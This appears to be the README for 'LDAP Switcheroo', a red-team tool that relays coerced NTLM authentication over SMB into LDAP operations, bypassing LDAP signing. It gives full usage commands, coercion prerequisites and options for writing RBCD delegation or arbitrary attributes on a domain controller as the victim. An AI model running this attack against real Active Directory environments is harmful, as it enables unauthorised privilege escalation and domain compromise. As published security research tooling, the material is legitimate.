# LDAP Switcheroo

Relay a coerced victim's NTLM authentication into an LDAP operation executed with the
victim's permissions, bypassing LDAP signing. Thin wrapper around Impacket's
`ntlmrelayx.py` (it starts `ntlmrelayx` for you).

## Background

Full writeup of the technique and root cause:
[**Signed, Sealed, and Relayed, NTLM-style: Bypassing LDAP Signing Through Reauthentication**](https://specterops.io/blog/2026/10/23/ldap-signing-bypass-ntlm-relay/)

## Requirements

- Python 3, run as root (SMB listener on TCP/445).
- A pinned Impacket exposing LDAP signing + security-context APIs (the PyPI `0.13.1`
  package is not sufficient). Point `PYTHONPATH` at it and pass its `ntlmrelayx.py`.
- A coercion tool to drive the victim to your listener (Coercer / PetitPotam).
- The victim must be coerced to authenticate over **SMB** (the only supported source).

## Usage

```
sudo PYTHONPATH=/path/to/pinned-impacket python3 switcheroo.py \
    'DOMAIN/attacker[:password]@DC.fqdn' \
    -dc-ip <DC_IP> \
    -base-dn 'DC=example,DC=com' \
    -listen-ip <ATTACKER_IP> \
    -victim 'DOMAIN/VICTIM$' \
    -modify-dn 'CN=VICTIM,CN=Computers,DC=example,DC=com' \
    -rbcd-sid '<ATTACKER_COMPUTER_SID>' \
    -ntlmrelayx /path/to/pinned-impacket/examples/ntlmrelayx.py
```

Then coerce the victim toward `-listen-ip` from another terminal.

Credentials follow Impacket's `[domain/]username[:password]@host`. Omit the password to
be prompted, or use `-hashes LMHASH:NTHASH` / `-no-pass`.

Keep stdin open (`ntlmrelayx` exits on EOF):

```
tail -f /dev/null | sudo PYTHONPATH=... python3 switcheroo.py ... &
```

## Key options

| Option | Meaning |
|---|---|
| `target` | `[domain/]username[:password]@<DC host/IP>` — attacker account + target DC |
| `-dc-ip` / `-base-dn` / `-listen-ip` | DC IP, search base, attacker listener IP |
| `-victim DOMAIN/account` | only relay this victim |
| `-modify-dn` | DN of the object to modify as the victim |
| `-rbcd-sid SID` | write an RBCD descriptor granting this SID |
| `-value` / `-value-hex` / `-attribute` | write an arbitrary attribute instead of RBCD |
| `-ntlmrelayx PATH` | path to `ntlmrelayx.py` |
| `-hashes`, `-no-pass`, `-debug`, `-ts` | auth / logging |

The tool prints the DC's `Bind`/`Modify` result codes and does an independent signed
read-back to confirm the write (the SMB/coercion side may still print `FAILED`).
